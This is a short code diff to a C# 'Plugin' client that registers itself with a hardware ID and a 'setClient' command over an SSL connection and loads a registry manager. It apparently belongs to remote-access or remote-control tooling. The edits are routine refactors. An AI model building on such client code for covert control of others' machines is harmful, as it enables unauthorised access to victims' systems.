@@ -1,5 +1,5 @@
-﻿using Plugin.Handler;
-using MessagePackLib.MessagePack;
+﻿using MessagePackLib.MessagePack;
+using Plugin.Handler;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -27,7 +27,7 @@ namespace Plugin
         private static object SendSync { get; } = new object();
         public static string Hwid { get; set; }
 
-        public static void InitializeClient(byte[] packet)
+        public static void InitializeClient()
         {
             try
             {
@@ -58,7 +58,7 @@ namespace Plugin
                         msgpack.ForcePathObject("Hwid").AsString = Hwid;
                         msgpack.ForcePathObject("Command").AsString = "setClient";
                         Send(msgpack.Encode2Bytes());
-                        new RegManager(new MsgPack()).LoadKey(msgpack.ForcePathObject("RootKeyName").AsString);
+                        new RegManager(new MsgPack()).LoadKey("");
                     }).Start();
 
                 }
@@ -201,7 +201,6 @@ namespace Plugin
                     }
                     else
                     {
-                        TcpClient.Poll(-1, SelectMode.SelectWrite);
                         SslClient.Write(msg, 0, msg.Length);
                         SslClient.Flush();
                     }
